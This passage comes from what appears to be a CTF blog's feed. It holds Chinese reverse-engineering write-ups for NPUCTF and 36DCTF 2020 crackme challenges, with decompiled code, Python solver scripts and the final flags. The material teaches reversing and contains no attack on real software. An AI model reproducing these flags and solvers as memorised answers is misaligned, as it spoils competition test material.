0x00000007, 0x0000007A&#125;;int main() &#123;    vm_operad(opcodes, 114);&#125;// 757515121f3d478</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> 网鼎杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF-wp</title>
      <link href="/2020/03/21/2020-NPUCTF/"/>
      <url>/2020/03/21/2020-NPUCTF/</url>
      
        <content type="html"><![CDATA[<p>最近事情比较多，题都没怎么看就跑路了</p><span id="more"></span><hr><blockquote><p>下面是我出的<strong>送分</strong>题</p></blockquote><h4 id="Basicasm"><a href="#Basicasm" class="headerlink" title="Basicasm"></a>Basicasm</h4><p>硬怼汇编，分奇偶处理，输出16进制，逆回去就可以了</p><pre><code>flag&#123;d0_y0u_know_x86-64_a5m?&#125;</code></pre><h3 id="Ezreverse1"><a href="#Ezreverse1" class="headerlink" title="Ezreverse1"></a>Ezreverse1</h3><p>简单的花指令加迷宫题，好心的出题人在每个花指令的地方都<code>patch</code>了很多个<code>nop</code>，<del>虽然这么做毫无意义</del></p><p>把简单的花指令<code>patch</code>掉</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  __int64 *v3; // rbx  char v4; // al  bool v5; // zf  __int64 v6; // rax  v3 = (__int64 *)malloc(0x188uLL);  *v3 = 234545231LL;  v3[1] = 344556530LL;  qword_202020 = (__int64)v3;  v3[7] = 1423431LL;  v3[2] = 453523423550LL;  v3[8] = 54535240LL;  v3[3] = 46563455531LL;  v3[9] = 234242550LL;  v3[4] = 34524345344661LL;  v3[12] = 123422421LL;  v3[5] = 34533453453451LL;  v3[13] = 2342420LL;  v3[6] = 2343423124234420LL;  v3[14] = 23414141LL;  v3[10] = 23424242441LL;  v3[15] = 23424420LL;  v3[11] = 2345355345430LL;  v3[16] = 13535231LL;  v3[18] = 23423414240LL;  v3[17] = 2341LL;  v3[20] = 53366745350LL;  v3[19] = 1234422441LL;  v3[27] = 3453326640LL;  v3[21] = 253244531LL;  v3[28] = 245332535325535341LL;  v3[22] = 45463320LL;  v3[29] = 7568546234640LL;  v3[23] = 24532661LL;  v3[30] = 23445576731LL;  v3[24] = 23433430LL;  v3[25] = 23453660LL;  v3[26] = 3453661LL;  v3[31] = 234534460LL;  v3[33] = 34455344551LL;  v3[35] = 2354657721451LL;  v3[32] = 234364561LL;  v3[36] = 23464664430LL;  v3[34] = 2345670LL;  v3[39] = 23643643334561LL;  v3[37] = 245646441LL;  v3[40] = 2346463450LL;  v3[38] = 234644640LL;  v3[41] = 2343345620LL;  v3[42] = 3444651LL;  v3[43] = 23451LL;  v3[44] = 67541LL;  v3[45] = 34575860LL;  v3[46] = 67856741LL;  v3[47] = 567678671LL;  v3[48] = 567565671LL;  puts(&quot;Input your flag:&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        while ( 1 )        &#123;          do            v4 = _IO_getc(stdin);          while ( v4 == 10 );          if ( v4 == 10 )            JUMPOUT(*(_QWORD *)&amp;byte_96B);          if ( v4 != 104 )            break;          if ( ((signed __int64)v3 - qword_202020) &gt;&gt; 3 != 7                                                         * (((signed __int64)((unsigned __int128)(5270498306774157605LL                                                                                                * (signed __int128)(((signed __int64)v3 - qword_202020) &gt;&gt; 3)) &gt;&gt; 64) &gt;&gt; 1)                                                          - (((signed __int64)v3 - qword_202020) &gt;&gt; 63)) )          &#123;            --v3;            v5 = v3 == 0LL;            goto LABEL_13;          &#125;        &#125;        if ( v4 != 106 )          break;        if ( (unsigned __int64)v3 - qword_202020 &gt; 0x30 )        &#123;          v3 -= 7;          v5 = v3 == 0LL;          goto LABEL_13;        &#125;      &#125;      if ( v4 == 107 )        break;      if ( v4 == 108 &amp;&amp; (((signed __int64)v3 - qword_202020) &gt;&gt; 3) % 7 != 6 )      &#123;        v5 = v3 + 1 == 0LL;        ++v3;        goto LABEL_13;      &#125;    &#125;    if ( (unsigned __int64)((char *)v3 - qword_202020 - 329) &gt; 0x37 )    &#123;      v5 = v3 + 7 == 0LL;      v3 += 7;LABEL_13:      v6 = *v3;      if ( v5 )        JUMPOUT(*(_QWORD *)&amp;byte_9F2);      if ( v6 == 567565671 )      &#123;        puts(&quot;Congratulations!&quot;);        puts(&quot;The flag is: flag&#123; YOUR INPUT &#125;&quot;);        exit(0);      &#125;      if ( v6 == 567565671 )        JUMPOUT(*(_QWORD *)&amp;byte_A01);      if ( !(v6 &amp; 1) )        break;    &#125;  &#125;  puts(&quot;You Failed!&quot;);  return 0LL;&#125;</code></pre><p>很显然这是一个7*7的迷宫，虽然数都很大很复杂，但是只比较奇偶，所以只要看最后一位就行了，就是一个很简单的迷宫</p><pre><code>flag&#123;kkkkkklljjjjljjllkkkkhkklll&#125;</code></pre><h3 id="Ezreverse2"><a href="#Ezreverse2" class="headerlink" title="Ezreverse2"></a>Ezreverse2</h3><p>简单的<code>jar2exe</code>，动态调试等解密完直接<code>dump</code>内存得到<code>jar</code>文件，反编译就可以了</p><pre><code>flag&#123;j4r2eXe_I5_@_p0wer7ul_To0l!&#125;</code></pre><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><blockquote><p>这题只上了校内赛道，改编自<code>b01lersCTF-2020</code>的一道题，觉得题目很不错拿来给校内做一做</p></blockquote><p><code>main</code>函数很简单</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  void *v4; // [rsp+0h] [rbp-28h]  unsigned __int64 v5; // [rsp+18h] [rbp-10h]  v5 = __readfsqword(0x28u);  sub_1340();  sub_14B0((__int128 *)&amp;v4);  sub_1100((__int64)&amp;v4);  if ( (unsigned __int8)sub_11C0((_BYTE **)&amp;v4) )    std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Congratulations!&quot;, 16LL);  else    std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Wrong!&quot;, 6LL);  std::endl&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout);  if ( v4 )    operator delete(v4);  return 0LL;&#125;</code></pre><p>可以看到使<code>if</code>判断为真就可以了</p><p><code>sub_1340()</code>函数纯粹用来输出，可以不看，下面几个函数观察一下可以看的出来，<code>sub_14B0()</code>用来输入，<code>sub_1100()</code>用来对输入进行处理，<code>sub_11C0()</code>用来判断</p><blockquote><p>每一个部分都很长，其实实现的功能很简单，是因为整型数组内存连续存放，所以被当作了很大的数据来处理了，看不明白的话建议动态调试</p></blockquote><p>输入之后数据被存放到了<code>v4</code>里，然后进行处理</p><pre><code class="cpp">unsigned __int64 __fastcall sub_1100(__int64 a1)&#123;  char *v1; // rax  char v2; // cl  unsigned __int64 v3; // rsi  int v4; // edx  __int64 v5; // rcx  _QWORD *v7; // rax  unsigned __int64 v8; // [rsp+8h] [rbp-10h]  v8 = __readfsqword(0x28u);  v1 = *(char **)a1;  if ( *(_QWORD *)(a1 + 8) != *(_QWORD *)a1 )  &#123;    v2 = *v1;    if ( *v1 == 10 )    &#123;LABEL_7:      v7 = (_QWORD *)__cxa_allocate_exception(8LL);      *v7 = &amp;unk_202CD0;      __cxa_throw(v7, &amp;`typeinfo for&#39;std::exception, &amp;std::exception::~exception);    &#125;    v3 = 0LL;    LOBYTE(v4) = 35;    while ( 1 )    &#123;      *v1 = v4 ^ v2;      v5 = (unsigned __int8)v4 + v3++;      v4 = v5 + ((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v5 &gt;&gt; 64) &gt;&gt; 7);      if ( v3 &gt;= *(_QWORD *)(a1 + 8) - *(_QWORD *)a1 )        break;      v1 = (char *)(v3 + *(_QWORD *)a1);      v2 = *v1;      if ( *v1 == 10 )        goto LABEL_7;    &#125;  &#125;  return __readfsqword(0x28u) ^ v8;&#125;</code></pre><p>只是进行了简单的异或，只不过是一遍生成一边和输入异或，不过这些数据和输入无关，可以先算出来，至于<code>v4 = v5 + ((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v5 &gt;&gt; 64) &gt;&gt; 7);</code>这一步的计算，其实仔细看看就会发现根本没有意义</p><p>接下来进行判断</p><pre><code class="cpp">__int64 __fastcall sub_11C0(_BYTE **a1)&#123;  __m128i *v1; // rbx  _BYTE *v2; // rcx  __m128i v3; // xmm0  __m128i v4; // xmm1  signed __int64 v5; // rsi  unsigned int v6; // ebp  struct _Unwind_Exception *v8; // rbp  v1 = (__m128i *)operator new(0xE8uLL);  v2 = *a1;  v1[1] = _mm_load_si128((const __m128i *)&amp;byte_1A10);  v3 = _mm_load_si128((const __m128i *)&amp;byte_1A20);  v1[14].m128i_i64[0] = -2051389526429375416LL;  v1[2] = v3;  v1[3] = _mm_load_si128((const __m128i *)&amp;byte_1A30);  v1[4] = _mm_load_si128((const __m128i *)&amp;byte_1A40);  v1[5] = _mm_load_si128((const __m128i *)&amp;byte_1A50);  v1[6] = _mm_load_si128((const __m128i *)&amp;byte_1A60);  v1[7] = _mm_load_si128((const __m128i *)&amp;byte_1A70);  v1[8] = _mm_load_si128((const __m128i *)&amp;byte_1A80);  v1[9] = _mm_load_si128((const __m128i *)&amp;byte_1A90);  v1[10] = _mm_load_si128((const __m128i *)&amp;byte_1AA0);  v1[11] = _mm_load_si128((const __m128i *)&amp;byte_1AB0);  v4 = _mm_load_si128((const __m128i *)&amp;byte_1A00);  v1[12] = _mm_load_si128((const __m128i *)&amp;byte_1AC0);  *v1 = v4;  v1[13] = _mm_load_si128((const __m128i *)&amp;byte_1AD0);  if ( a1[1] == v2 )  &#123;    v5 = 0LL;LABEL_11:    v8 = (struct _Unwind_Exception *)std::__throw_out_of_range_fmt(                                       &quot;vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)&quot;,                                       v5,                                       v5);    operator delete(v1);    _Unwind_Resume(v8);  &#125;  if ( (_BYTE)byte_1A00 == *v2 )  &#123;    v5 = 1LL;    do    &#123;      if ( v5 == a1[1] - v2 )        goto LABEL_11;      if ( *((_BYTE *)v1-&gt;m128i_i64 + 4 * v5) != v2[v5] )        goto LABEL_9;      ++v5;    &#125;    while ( v5 != 58 );    v6 = 1;  &#125;  else  &#123;LABEL_9:    v6 = 0;  &#125;  operator delete(v1);  return v6;&#125;</code></pre><p>关键其实只有一个相等的判断，不过两个数组每次索引值增加的不一样，每四位进行一次比较就好了</p><pre><code class="python">target = [0x45, 0xE6, 0xD0, 0x4A, 0x4F, 0xC3, 0x7E, 0xAA, 0x45, 0xFC, 0x42, 0xB2, 0x41, 0xB5, 0x01, 0xB4, 0x52, 0x7D,          0x39, 0x20, 0x1A, 0xC0, 0x4E, 0x13, 0x5A, 0x2F, 0x67, 0xAA, 0x5D, 0x79, 0x6B, 0xF5, 0x4D, 0x06, 0x41, 0x79,          0x22, 0x35, 0xF9, 0xC8, 0x0F, 0xDE, 0x88, 0x51, 0x33, 0x4C, 0xF0, 0x81, 0x50, 0xF4, 0xEE, 0x14, 0x2E, 0xF1,          0x25, 0xBD, 0x10, 0x7C, 0x62, 0x30, 0xE3, 0xF8, 0x80, 0x2B, 0xC4, 0x85, 0x2A, 0xF8, 0xCF, 0x5A, 0xAE, 0xCB,          0x8C, 0x3A, 0xA2, 0xD0, 0xBB, 0xC5, 0x8C, 0x5D, 0x83, 0x34, 0x6B, 0xF9, 0x81, 0x72, 0x4B, 0x0E, 0x54, 0xC3,          0x71, 0x53, 0x55, 0xE9, 0x07, 0xBB, 0x50, 0x1A, 0xE7, 0x07, 0x64, 0x1B, 0x75, 0x74, 0x5E, 0x8E, 0x5D, 0x2E,          0xDC, 0xF6, 0x17, 0x3B, 0xEC, 0xED, 0xD7, 0xBD, 0xDF, 0xE9, 0x76, 0x63, 0x88, 0xE2, 0xEA, 0x89, 0x85, 0xD7,          0x4F, 0x34, 0x67, 0x39, 0xD5, 0x58, 0x05, 0xD9, 0xD2, 0xD2, 0x34, 0x69, 0xF1, 0xBF, 0x49, 0x76, 0xE1, 0x9C,          0xFE, 0x0D, 0x0C, 0xB3, 0xD2, 0x06, 0x48, 0xDA, 0xD1, 0xD5, 0x1E, 0xB8, 0x54, 0x94, 0x4C, 0x98, 0x06, 0x8A,          0x68, 0xA8, 0x28, 0x5E, 0x64, 0xF9, 0xE6, 0x58, 0xF7, 0x02, 0xF2, 0x8D, 0x3B, 0x88, 0xBD, 0x14, 0xEC, 0x8F,          0x31, 0x70, 0x0C, 0x0B, 0x41, 0x66, 0x22, 0x8E, 0x19, 0x58, 0x01, 0x2E, 0xD0, 0xDC, 0x4B, 0xC0, 0x88, 0xF4,          0xDA, 0xE6, 0x9F, 0x73, 0x88, 0x7D, 0x7C, 0x91, 0x1F, 0x75, 0x25, 0x70, 0xD6, 0x0C, 0xBA, 0x09, 0x7C, 0xF2,          0xD3, 0x4E, 0xA1, 0x09, 0x83, 0x51, 0x3C, 0xBA, 0x48, 0x64, 0x38, 0x2D, 0x18, 0x00, 0x88, 0xE3]v = [35]for i in range(58):    v.append((v[i] + i) % 0xff)flag = &quot;&quot;for i in range(58):    flag += chr(target[i * 4] ^ v[i])print(flag)</code></pre><p>直接输出flag</p><pre><code>flag&#123;7here_i5_no_d0ubt_th47_re_pr0b1em5_4re_e4sy_7o_s0lve&#125;</code></pre><hr><blockquote><p>下面是其他师傅的题目</p></blockquote><h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>混淆了一下，函数的功能很简单，调试一下就出来了</p><h3 id="你好sao啊"><a href="#你好sao啊" class="headerlink" title="你好sao啊"></a>你好sao啊</h3><p>很显然换表base64，解一下就出来了</p><h3 id="Anti-IDA"><a href="#Anti-IDA" class="headerlink" title="Anti-IDA"></a>Anti-IDA</h3><p>出题人给hint说不要用IDA，但我在这之前已经用IDA做完了……</p><p>其实只需要调整一下堆栈平衡，patch一些花指令，这题并没有什么难度，但是这么些个逻辑运算真的恶心</p><p>首先从main函数走到了<code>sub_401E10</code>，所有的操作都在这里处理</p><pre><code class="cpp">  length0 = strlen(commandline_input);  input0[0] = 0;  memset(&amp;input0[1], 0, 0x3FCu);  v51 = 0;  v52 = 0;  scanf(&quot;%s&quot;, input0);  length1 = strlen(input0);  length_input = length1;</code></pre><p><code>commandline_input</code>可以不管它，先是输入了flag然后获取了长度，然后走第一个判断</p><pre><code class="cpp">      input0[length_input] = 10;      v48 = 32;      for ( i = 0; i &lt; length_input; ++i )        input0[i] -= v48;      v45 = (unsigned __int8)input0[2] &gt; length_input;      v44 = (unsigned __int8)input0[1] &gt; v48;      if ( alwaystrue12(v44, v45) == 1 )        sub_40105A();                           // 第一步      v45 = (unsigned __int8)input0[2] &gt; length_input;      v44 = (unsigned __int8)input0[1] &gt; v48;      if ( !alwaystrue12(v44, v45) )        sub_401064();</code></pre><p>用到的判断是一个永真判断，所以默认执行第一个函数，初始化<code>target1</code>为奇数</p><pre><code class="cpp">int sub_401870()&#123;  int result; // eax  signed int i; // [esp+50h] [ebp-4h]  for ( i = 0; i &lt;= 5; ++i )  &#123;    target1[i] = 2 * i + 1;    result = i + 1;  &#125;  return result;&#125;</code></pre><p>下面的几个逻辑判断发现也是永真，执行到这一步</p><pre><code class="cpp">if ( alwaystrue1(SLODWORD(v46), SHIDWORD(v46)) == 1 )          deal_with_4321c0();</code></pre><p>初始化了一个<code>tttt</code>的数组，然后又执行了一个函数</p><pre><code class="cpp">int (*sub_401A10())()&#123;  tttt[0] = pow(2, 2) + 1;  dword_4321C4 = tri(1);  dword_4321C8 = 1;  dword_4321CC = tri(1);  dword_4321D0 = pow(2, 2) + 2;  dword_4321D4 = 1;  dword_4321D8 = 1;  return off_42EA3C[0];&#125;</code></pre><p>但是这里的处理显然是假的，后面返回的函数又对这个数组进行了重新的赋值，真正的赋值部分在下面</p><pre><code class="cpp">void *sub_4015F0()&#123;  void *retaddr; // [esp+0h] [ebp+0h]  tttt[0] = pow(2, 2);  dword_4321C4 = pow(2, 2) + 1;  dword_4321C8 = 2;  dword_4321CC = tri(1);  dword_4321D0 = 1;  dword_4321D4 = pow(2, 2);  dword_4321D8 = pow(2, 1);  return retaddr;&#125;</code></pre><p>然后又是一个永真的判断</p><pre><code class="cpp">        v1 = sqrt(v46);        v2 = _ftol(v1);        v3 = pow(5, v2) - 1;        if ( !(v3 % pow(2, 2)) )                // 第三步        &#123;          for ( i = 0; i &lt; length_input; ++i )            input0[i] += input0[i + 1];          for ( i = length_input - 1; i &gt; 0; --i )            input0[i] += *((_BYTE *)&amp;length_input + i + 3);          for ( i = length_input - 1; i &gt; 0; --i )            byte_4323C0[i] += v48 + *((_BYTE *)&amp;length_input + i + 3);          hex2str((int)input0, (int)input_step2, length_input);          sub_401073();        &#125;</code></pre><p>输入进行了几步处理，然后把输入的字符16进制转成字符串存储起来，长度翻倍，最后执行了<code>sub_401073()</code>函数，跳到了这个位置</p><pre><code class="cpp">int (*sub_4017A0())()&#123;  signed int i; // [esp+50h] [ebp-4h]  for ( i = 0; i &lt;= 64; ++i )    final_target[i] = i * i;  return off_42EA40;&#125;</code></pre><p><code>return</code>了一个偏移量，<del>发现事情并不单纯</del>，应该和上面一样又套了一层</p><pre><code class="cpp">void *__usercall sub_401680@&lt;eax&gt;(int a1@&lt;ebp&gt;)&#123;  void *retaddr; // [esp+0h] [ebp+0h]  memset(dword_4328C0, 0, 0x400u);  memset(final_target, 0, 0x400u);  for ( *(_DWORD *)(a1 - 8) = 2; *(_DWORD *)(a1 - 8) &lt;= dword_42EA30; ++*(_DWORD *)(a1 - 8) )  &#123;    if ( !dword_4328C0[*(_DWORD *)(a1 - 8)] )      final_target[++final_target[0]] = *(_DWORD *)(a1 - 8);    for ( *(_DWORD *)(a1 - 4) = 1; *(_DWORD *)(a1 - 4) &lt;= final_target[0]; ++*(_DWORD *)(a1 - 4) )    &#123;      if ( final_target[*(_DWORD *)(a1 - 4)] * *(_DWORD *)(a1 - 8) &gt; dword_42EA30 )        break;      dword_4328C0[final_target[*(_DWORD *)(a1 - 4)] * *(_DWORD *)(a1 - 8)] = 1;      if ( !(*(_DWORD *)(a1 - 8) % final_target[*(_DWORD *)(a1 - 4)]) )        break;    &#125;  &#125;  return retaddr;&#125;</code></pre><p>处理看起来不是很简单，但是和输入没什么关系，直接动态调试<code>dump</code>出来就行了，没什么难度</p><p>接着进行了一个逆序</p><pre><code class="cpp">reverse((int)input_step2, 2 * length_input);// 第四步</code></pre><p>接下来的几个逻辑判断判断一下就不难发现最后走的是这一部分的处理</p><pre><code class="cpp">        else                                    // 第五步        &#123;          for ( i = 0; i &lt; 2 * length_input; ++i )          &#123;            v14 = tri(1);            v15 = pow(2, v14);            v16 = i;            input_step2[i] += LOBYTE(tttt[i % (v15 - 1)]);            HIDWORD(v46) = i;            LOBYTE(v16) = input_step2[i];            sub_401019(v16, i);            input_step2[i] = v17;            *(&amp;str2 + i) = (unsigned __int8)input_step2[i] + 2 * i;          &#125;        &#125;</code></pre><p><code>sub_401019(v16, i)</code>的内容看一下也很容易出来</p><pre><code class="cpp">int __cdecl sub_401CD0(char a1, int a2)&#123;  signed int v2; // ST58_4  v2 = sub_40101E(4) - 2;  return a2 % (signed int)(sub_40101E(3) - 2) ^ target1[a2 % v2] ^ a1;&#125;</code></pre><p>简单的两层异或，中间套了一个函数，传的是固定参数，调试很容易出来，不过这个函数也不复杂，可以直接分析出来</p><pre><code class="cpp">size_t __cdecl sub_401820(int a1)&#123;  return a1 * strlen(off_42EA34);&#125;</code></pre><p>求得是这一部分的长度</p><pre><code class="cpp">.data:0042EA34     ; char *off_42EA34.data:0042EA34     off_42EA34      dd offset unk_42C01C    ; DATA XREF: sub_401820+18↑r.data:0042EA38     off_42EA38      dd offset sub_401023    ; DATA XREF: sub_401950+7C↑r.data:0042EA3C     off_42EA3C      dd offset sub_401050    ; DATA XREF: sub_401A10+7F↑r.data:0042EA40     off_42EA40      dd offset sub_40103C    ; DATA XREF: sub_4017A0+46↑r.data:0042EA44                     align 10h</code></pre><p>但第一部分是数据，肯定不是整个的长度，一定有<code>\0</code>让<code>strlen</code>截断</p><pre><code class="cpp">.rdata:0042C01C     unk_42C01C      db  58h ; X             ; DATA XREF: .data:off_42EA34↓o.rdata:0042C01D                     db  58h ; X.rdata:0042C01E                     db    0.rdata:0042C01F                     db    0</code></pre><p>发现长度为2，并且在<code>.rdata</code>段，程序运行过程中没有修改，检验一下查一查交叉引用发现果然没有，回到原来的位置，<code>sub_40101E</code>的作用很简单，就是<code>*2</code>，所以返回的值也可以写成</p><pre><code class="cpp">return a2 % 4 ^ target1[a2 % 6] ^ a1</code></pre><p>下面再稍微判断一下，永远走的是这个处理</p><pre><code class="cpp">        if ( v25 &gt;= pow(v40 / 2, 2) )           // 第六步        &#123;          for ( i = 0; i &lt; 2 * length_input; ++i )          &#123;            v26 = tri(1);            v27 = pow(2, v26);            *(&amp;str2 + i) *= final_target[i % (v27 - 1)];            v28 = pow(i, 2);            *(&amp;str2 + i) += v28 - i;          &#125;        &#125;</code></pre><p>然后四位变五位</p><pre><code class="cpp">        for ( i = 0; i &lt; 2 * length_input; ++i )// 第七步        &#123;          memset(&amp;str1, 0, 0x16u);          tmp = *(&amp;str2 + i);          sprintf(&amp;str1, &quot;%05d&quot;, tmp);          strcat(&amp;str0, &amp;str1);        &#125;</code></pre><p>几步处理之后继续16进制转字符串</p><pre><code class="cpp">        length2 = strlen(&amp;str0);        for ( i = 0; i &lt; length2; ++i )        &#123;          v33 = tri(1);          v34 = pow(2, v33);          v35 = i % (v34 - 1);          *(&amp;str0 + i) += i % pow(2, 2) + tttt[v35];        &#125;        reverse((int)&amp;str0, length2);        hex2str((int)&amp;str0, (int)&amp;hex, length2);</code></pre><p>最后进行比较</p><pre><code class="cpp">if ( !strcmp(                &amp;hex,                &quot;3D393A37343C39373A343A373D36363A3B3934333539363437373934383736373B38333D3D3D37313C3B3A36353C393437373C38&quot;                &quot;3E343434393B34343C37343E373B3C3938343C3C39383238373F36323C3C3933383939363535373A373535393F373D34373C3435&quot;                &quot;35393C39383336363B37333639353435393B3D313636363B35363833383D35333E3A3532383837353438373E373437343E34363A&quot;                &quot;3D3A3233393939323735393A3D363B3B3736333B3C3436313F3C3D3435363537353739343A33343239383334363E3339373B373A&quot;                &quot;3634373D3B3632373C3B35323D373732383739353435353A3834353538343934&quot;) )          printf(&quot;PASS!\n&quot;);        else          printf(&quot;WHAT?\n&quot;);</code></pre><p>整个过程没有什么特别复杂的处理，逆起来也没什么难度</p><pre><code class="python">finaltarget = [54, 2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101,               103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211,               223, 227, 229, 233, 239, 241, 251]tttt = [4, 5, 2, 3, 1, 4, 2]target1 = [1, 3, 5, 7, 9, 11]final = &quot;3D393A37343C39373A343A373D36363A3B3934333539363437373934383736373B38333D3D3D37313C3B3A36353C393437373C383E343434393B34343C37343E373B3C3938343C3C39383238373F36323C3C3933383939363535373A373535393F373D34373C343535393C39383336363B37333639353435393B3D313636363B35363833383D35333E3A3532383837353438373E373437343E34363A3D3A3233393939323735393A3D363B3B3736333B3C3436313F3C3D3435363537353739343A33343239383334363E3339373B373A3634373D3B3632373C3B35323D373732383739353435353A3834353538343934&quot;f = []i = 0while i &lt; len(final):    f.append(int(final[i:i + 2], 16))    i += 2f.reverse()for i in range(len(f)):    f[i] -= i % 4 + tttt[i % 7]# print(f)tmp = &#39;&#39;.join([chr(i) for i in f])# print(tmp)str2 = []j = 0while j &lt; len(tmp):    str2.append(int(tmp[j:j + 5]))    j += 5# print(tmp_f)for i in range(len(str2)):    str2[i] -= (i ** 2 - i)    str2[i] //= finaltarget[i % 7]# print(str2)input_step2 = []for i in range(len(str2)):    input_step2.append((((str2[i] - 2 * i) ^ (i % 4) ^ (target1[i % 6])) &amp; 0xff) - tttt[i % 7] &amp; 0xff)input_step2.reverse()input0 = &#39;&#39;.join([chr(i) for i in input_step2])inp = []i = 0while i &lt; len(input0):    inp.append(int(input0[i:i + 2], 16))    i += 2for i in range(1, len(inp)):    inp[i] -= inp[i - 1]    inp[i] &amp;= 0xff# print([hex(i) for i in inp])inp.append(10)i = len(inp) - 1while i &gt; 0:    inp[i - 1] -= inp[i]    i -= 1    inp[i] &amp;= 0xfffor i in range(len(inp) - 1):    inp[i] += 32flag = &#39;&#39;.join([chr(i) for i in inp])print(flag)</code></pre><p>最后的flag</p><pre><code>NNPPUUCTF&#123;S0_M4NY_BUG5!&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> NPUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>36DCTF-wp</title>
      <link href="/2020/03/21/2020-36DCTF/"/>
      <url>/2020/03/21/2020-36DCTF/</url>
      
        <content type="html"><![CDATA[<p>2020-36DCTF</p><span id="more"></span><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p>IDA打开是下面这个样子</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  __int64 v3; // rdx  __int64 v4; // rcx  int v6; // [rsp+4h] [rbp-8Ch]  unsigned int v7; // [rsp+8h] [rbp-88h]  int v8; // [rsp+Ch] [rbp-84h]  int v9; // [rsp+10h] [rbp-80h]  int v10; // [rsp+14h] [rbp-7Ch]  int v11; // [rsp+18h] [rbp-78h]  int v12; // [rsp+1Ch] [rbp-74h]  int v13; // [rsp+20h] [rbp-70h]  int v14; // [rsp+24h] [rbp-6Ch]  int v15; // [rsp+28h] [rbp-68h]  int v16; // [rsp+2Ch] [rbp-64h]  int v17; // [rsp+30h] [rbp-60h]  int v18; // [rsp+34h] [rbp-5Ch]  int v19; // [rsp+38h] [rbp-58h]  int v20; // [rsp+3Ch] [rbp-54h]  int v21; // [rsp+40h] [rbp-50h]  int v22; // [rsp+44h] [rbp-4Ch]  int v23; // [rsp+48h] [rbp-48h]  int v24; // [rsp+4Ch] [rbp-44h]  int v25; // [rsp+50h] [rbp-40h]  int v26; // [rsp+54h] [rbp-3Ch]  int v27; // [rsp+58h] [rbp-38h]  int v28; // [rsp+5Ch] [rbp-34h]  int v29; // [rsp+60h] [rbp-30h]  int v30; // [rsp+64h] [rbp-2Ch]  int v31; // [rsp+68h] [rbp-28h]  int v32; // [rsp+6Ch] [rbp-24h]  int v33; // [rsp+70h] [rbp-20h]  int v34; // [rsp+74h] [rbp-1Ch]  int v35; // [rsp+78h] [rbp-18h]  int v36; // [rsp+7Ch] [rbp-14h]  int v37; // [rsp+80h] [rbp-10h]  int v38; // [rsp+84h] [rbp-Ch]  int v39; // [rsp+88h] [rbp-8h]  char v40; // [rsp+8Ch] [rbp-4h]  v9 = 102;  v10 = 109;  v11 = 99;  v12 = 98;  v13 = 127;  v14 = 58;  v15 = 85;  v16 = 106;  v17 = 57;  v18 = 82;  v19 = 122;  v20 = 55;  v21 = 81;  v22 = 19;  v23 = 51;  v24 = 35;  v25 = 67;  v26 = 70;  v27 = 41;  v28 = 61;  v29 = 41;  v30 = 32;  v31 = 127;  v32 = 28;  v33 = 38;  v34 = 77;  v35 = 49;  v36 = 20;  v37 = 80;  v38 = 94;  v39 = 0xFFFFFFE8;  sub_4007F8((__int64)&amp;v40, 0LL, 4LL);  v7 = 0;  v6 = 0;  sub_400808((__int64)aFlag);  do  &#123;    v8 = sub_400818((__int64)aFlag, 0LL);    v6 |= v8 ^ v7 ^ (v7 + (v7 ^ *(&amp;v9 + (signed int)v7)));    v4 = v7++;  &#125;  while ( v8 &amp;&amp; v8 != 10 &amp;&amp; v8 != -1 );  if ( v6 )    sub_400828(aFailed, 0LL, v3, v4);  else    sub_400828(aCorrect, 0LL, v3, v4);  return 0;&#125;</code></pre><p>很简单，写个脚本就出来了，签到成功</p><pre><code class="python">target = [102, 109, 99, 98, 127, 58, 85, 106, 57, 82, 122, 55, 81, 19, 51, 35, 67, 70, 41, 61, 41, 32, 127, 28, 38, 77,          49, 20, 80, 94]flag = &quot;&quot;for i in range(len(target)):    flag += chr(i ^ (i + (i ^ target[i])))print(flag)# flag&#123;A_s1mpLe&amp;E4sy_RE_i5Nt_1t&#125;</code></pre><h4 id="神光"><a href="#神光" class="headerlink" title="神光"></a>神光</h4><p>IDA打开，根据提示语找到关键函数</p><pre><code class="cpp">int __usercall sub_415C10@&lt;eax&gt;(int a1@&lt;xmm0&gt;, int a2@&lt;ebx&gt;)&#123;  int v2; // eax  int v3; // edx  int v4; // ecx  int v5; // eax  int v6; // edx  int v7; // ecx  int v8; // ecx  int v9; // eax  int v10; // edx  int v11; // ecx  int v12; // edx  int v13; // ST0C_4  char v15; // [esp+0h] [ebp-ECh]  char input1; // [esp+D0h] [ebp-1Ch]  int v17; // [esp+E8h] [ebp-4h]  int savedregs; // [esp+ECh] [ebp+0h]  sub_41122B((int)&amp;unk_41C032);  sub_411406();  while ( 1 )  &#123;    printf((int)&quot;请输入key:\n&quot;, v15);    scanf((const char *)&amp;unk_417B40, (unsigned int)&amp;input1, 20);    sub_4113B1(a1, &amp;input1);    if ( target1 )      break;    v2 = puts(&quot;系统错误,请再试一次\n&quot;);    sub_411235(v4, v3, &amp;v15 == &amp;v15, v2, a1);  &#125;  sub_41141A(a1);  v5 = MessageBoxA(0, &quot;认证成功,离flag又近了一步&quot;, &quot;恭喜&quot;, 0);  sub_411235(v7, 